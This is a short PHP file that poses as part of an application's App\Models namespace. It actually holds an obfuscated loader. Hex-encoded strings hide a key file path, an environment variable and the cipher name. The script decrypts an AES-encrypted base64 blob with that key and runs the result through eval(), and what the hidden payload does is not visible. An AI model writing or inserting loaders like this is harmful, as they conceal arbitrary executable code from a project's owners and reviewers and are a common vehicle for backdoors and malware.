<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('C/lDjZ77X7kE/ma1J330uA==');

$c=base64_decode(

'2R7rZ2OGSpi9YegjYwYzf7yjxRRK0AE0u2D+0N4ECjwVp7xvjcFej4Vxk++4qRAWWr1+s5GpBwaj' .
'Bb94SpBx2arVdsKh+KjpGspqaxXEQMhuUZwYP6058rIpT7b1crX3wc6MBf5LN+UMVeDFS7FrJCMX' .
'BxuDAdYIxMODXgdh7TrJgYOsOlqniMyfkepR2UlLxBwYpnTZEnM7505/TzN6x/YSXdWn29JhwlF3' .
'0m37fCng7w3exbdzR7n8Wlh4inYB1QJ6lNkC3/5U+ItBkk1vkZ8jzrtKfPGdhvFU9PyCA4T8RgXv' .
'Psq6eBMMfow+C3BEjBI30/zoCUWUQMk53IbDne8w7sW5Mm3B8e3s1Ph0VYPwAi49zOXn/ZGDdmuW' .
'iSZosYK2s0sRLsP9dXBSiPFsH3ZAx2K/pT4TV3jKVJyPs3ISQ5ne9M8h5fyBW9k/niX6Zg+BdI34' .
'yPR//+VAuW2iGSCecbdZCmkl61qaVQsw481JJRWmxlTBOrT+WgfDkSNqMcx3jD8icXNvclndBvJX' .
'kIHpLtxz3PzcgXOdOIC3NfY/VleUAns15nLFuEO3j8WV7qsrCYmJNIj/Pm/+3lwoe0/JEHdWzlID' .
'cAVH0xoG4a93PsjLdTjjD8HagawXu/CD1q/6alXgY161DDuEmTyGKpQB4NLTKhJfSjd/LjGiQB/C' .
'UtI/BKn+OApJ+3YfEK/lJOr9y6AmwpUlOrWZw2pP3MlvxoETgldkfNhj3caH7zTdaod1oeocR5fw' .
'ZUSzFDi3vTXPZsPuCqxb5cWwUD64572rQB22/bGkMjVb0rkV05A4s8zeaqLsEaoNDudcWnIHA/I+' .
'10osOC2laJHtcLxSP5iF5thwBaocvA34R/j5ij0ToN2EmrKVURYGQkTRNLiZZuj84hI7z7N23qSx' .
'bjM8/u4uJMTBeNDrhcKQUBOc6mKmYo+NBW6rngabo+93QlfdL8oGSN6xpd3W4yDLRx7RLA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

